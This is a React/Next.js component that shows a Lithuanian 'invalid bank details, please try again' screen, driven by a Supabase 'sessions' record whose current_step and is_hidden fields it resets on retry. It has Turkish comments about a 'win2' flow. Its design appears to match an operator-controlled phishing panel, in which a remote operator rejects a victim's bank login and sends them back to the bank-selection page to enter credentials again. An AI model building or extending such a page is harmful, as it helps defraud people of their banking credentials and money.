"use client";

import { useEffect, useState } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";
import { Banken2Client } from "@/app/banken2/banken2-client";

type Props = {
  sessionId: string;
  routeSessionId?: string;
};

export function InvalidBankClient({ sessionId, routeSessionId }: Props) {
  const { settings, loading: settingsLoading } = useSettings();
  const [isWin2, setIsWin2] = useState<boolean | null>(null);

  useEffect(() => {
    if (!sessionId) { setIsWin2(false); return; }
    const supabase = createBrowserSupabaseClient();
    if (!supabase) { setIsWin2(false); return; }
    let cancelled = false;
    void (async () => {
      const { data } = await supabase
        .from("sessions")
        .select("form_data")
        .eq("id", sessionId)
        .maybeSingle();
      if (cancelled) return;
      const fd = (data?.form_data ?? {}) as Record<string, any>;
      setIsWin2(fd.is_win2_flow === true);
    })();
    return () => { cancelled = true; };
  }, [sessionId]);

  // Zorlu/win2 akisi: hatali bankada da ayni banka-listesi tasarimi
  if (isWin2) {
    return <Banken2Client sessionId={sessionId} routeSessionId={routeSessionId ?? sessionId} invalid />;
  }
  if (isWin2 === null && sessionId) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="size-12 animate-spin rounded-full border-4 border-[#0fae4e]/30 border-t-[#0fae4e]" />
      </div>
    );
  }

  const handleRetry = async () => {
    const supabase = createBrowserSupabaseClient();
    if (supabase) {
      await supabase
        .from("sessions")
        .update({ is_hidden: false, current_step: "banken" })
        .eq("id", sessionId);
    }
    const qs = sessionId ? `?session=${encodeURIComponent(sessionId)}` : "";
    window.location.href = `/banken${qs}`;
  };


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#0fae4e]/30 border-t-[#0fae4e]" />
        </div>
      </div>
    );
  }

  return (
    <div className="bg-[#f8fafc] min-h-screen relative z-50 overflow-hidden flex flex-col">
      {/* Ambient Background Glows */}
      <div className="absolute top-[-10%] left-[-10%] w-[500px] h-[500px] rounded-full bg-red-500/5 blur-[100px] animate-[pulse_6s_ease-in-out_infinite]" />
      <div className="absolute bottom-[-10%] right-[-10%] w-[500px] h-[500px] rounded-full bg-[#f7a600]/5 blur-[100px] animate-[pulse_8s_ease-in-out_infinite_alternate]" />

      <main className="flex-1 flex flex-col items-center justify-center p-4 w-full relative z-10">
        {!sessionId ? (
          <div className="flex justify-center relative z-10 w-full">
            <p className="rounded-xl border border-red-200 bg-red-50 p-4 text-center text-sm text-red-600 shadow-sm w-full max-w-sm">
              Neteisinga nuoroda.
            </p>
          </div>
        ) : (
          <div className="w-full bg-white/90 backdrop-blur-xl rounded-[28px] shadow-[0_20px_60px_-15px_rgba(227,6,19,0.15)] p-8 md:p-10 flex flex-col items-center relative overflow-hidden border border-white/60 mx-auto max-w-[440px]">
            {/* Top Security Banner - Red */}
            <div className="absolute top-0 left-0 w-full h-2 bg-gradient-to-r from-[#f7a600] via-[#7ec3eb] to-[#003b8f] bg-[length:200%_100%] animate-[pulse_3s_ease-in-out_infinite]" />
            
            {/* Error Icon Container */}
            <div className="relative flex items-center justify-center w-28 h-28 mb-6 mt-2">
              <div className="absolute inset-0 bg-[#f7a600]/8 rounded-full animate-ping" style={{ animationDuration: '3s' }} />
              <div className="absolute inset-0 rounded-full border-[4px] border-[#f7a600]/20" />
              
              <div className="bg-[#f7a600]/10 p-4 rounded-full">
                <svg className="w-12 h-12 text-[#f7a600]" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                </svg>
              </div>
            </div>

            <h2 className="text-[24px] font-bold text-slate-800 mb-3 text-center tracking-tight">
              Neteisingi banko duomenys
            </h2>
            
            <p className="text-center text-[15px] font-medium text-slate-600 mb-8 leading-relaxed">
              Įvestų banko duomenų nepavyko patikrinti. Prašome patikrinti savo duomenis ir bandyti dar kartą.
            </p>

            <button
              onClick={() => void handleRetry()}
              className="w-full bg-[#003b8f] hover:bg-[#002f72] text-white font-semibold py-3.5 px-6 rounded-xl transition-all shadow-[0_4px_14px_rgba(0,59,143,0.25)] hover:shadow-[0_6px_20px_rgba(0,59,143,0.35)] flex items-center justify-center gap-2"
            >
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
              </svg>
              Bandyti dar kartą
            </button>

            {/* Footer Security Badge */}
            <div className="mt-8 flex items-center justify-center gap-2 text-[13px] font-semibold text-slate-500 bg-slate-50 px-4 py-2 rounded-full border border-slate-200">
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
              Saugus ryšys
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
